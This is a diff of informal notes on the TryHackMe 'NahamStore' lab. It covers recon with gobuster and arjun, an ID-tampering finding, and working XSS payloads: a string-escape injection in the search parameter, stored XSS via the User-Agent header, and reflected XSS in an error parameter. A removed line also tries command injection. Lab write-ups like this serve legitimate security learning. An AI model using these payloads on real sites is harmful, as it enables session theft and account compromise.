@@ -18,7 +18,7 @@ I will be using tools I have not used for some time and probably some new ones t
 TARGET_IP = 10.112.145.197
 REPLACE_TARGET_IP = 
 
-### Recon
+# Recon
 
 add `10.112.145.197 something.nahamstore.thm www.nahamstore.thm nahamstore.thm` to our hosts file (sudo nano /etc/hosts)
 
@@ -85,6 +85,8 @@ gobuster time
 `--xl <length>` excludes length or range (eg. --xl 100-200)
 
 `gobuster dir -u http://shop.nahamstore.thm -w /usr/share/wordlists/dirb/common.txt -t 40 -x js,php,txt --xl 194`
+
+note that ffuf/wfuzz fit better in this situation
 
 this one did not work well, because of the site having no actual content to go through
 
@@ -209,9 +211,11 @@ we changed the ids to find some JJs social security number
 
 now we are supposed to find XSS
 
-### XSS
+# XSS
 
 this room is wicked (as opposed to the usual "go here do that" philosophy of THM rooms), it's just "go find XSS, good luck"
+
+### XSS at nahamstore.thm/
 
 very funny thing, I tried injecting JS through the products' id parameter
 
@@ -284,19 +288,19 @@ resulting code:
 
 succesful XSS!
 
-I tried other fields, but they were label-type, and 
+I tried other fields, but they had strict limitations (drop-down menu, only numbers)
 
-</label></div><script>alert("xss")</script>
-
-#### login
+#### login and register
 
 arjun -u http://nahamstore.thm/login/  
 [+] Extracted 2 parameters from response for testing: login_password, login_email  
 
-#### register
-
+email accepted only emails and password field did not run our code  
+---  
 arjun -u http://nahamstore.thm/register/  
 [+] Extracted 2 parameters from response for testing: register_password, register_email  
+
+same as /login
 
 #### search
 
@@ -304,4 +308,77 @@ arjun -u http://nahamstore.thm/register/
 
 [✓] parameter detected: q, based on: body length
 
-http://nahamstore.thm/search?q=1`id`
+
+we fortunately get the whole JS code handling this searching parameter, so...
+
+var search = 'hello';
+
+1) escape the single quote (to search for '')
+2) end current line with a semicolon
+3) put our code here
+4) end our code line with a semicolon
+5) comment out the server-added part `';` with `//`
+
+clean escape:
+
+```js
+
+http://nahamstore.thm/search?q=';alert("xss");//
+
+// what the code does:
+
+var search = '';alert("xss");//';
+
+
+
+```
+
+```
+more general escape query (also works):
+
+http://nahamstore.thm/search?q=hoodie"';alert("xss");'"//
+
+// what the code does:
+
+
+
+```
+
+#### basket - stored XSS
+
+
+we intercepted a request to placing an order on http://nahamstore.thm/basket
+
+we used User-Agent parameter to create stored XSS (shows when site is viewed)
+
+```
+POST /basket HTTP/1.1
+Host: nahamstore.thm
+User-Agent: <script>alert(origin)</script>
+```
+
+stored XSS stays on site: `http://nahamstore.thm/account/orders/4`
+
+
+### XSS at marketing.nahamstore.thm
+
+```
+
+arjun -u http://marketing.nahamstore.thm/  
+[✓] parameter detected: error, based on: body length
+
+http://marketing.nahamstore.thm/?error=<script>alert("xss")</script>
+
+works!
+
+
+
+></div><script>alert("more xss")</script>//
+```
+
+
+
+
+10.114.174.53
+
+WTF is this room, I spent about 25 minutes on nothing like 3 times and cannot get nowhere lol
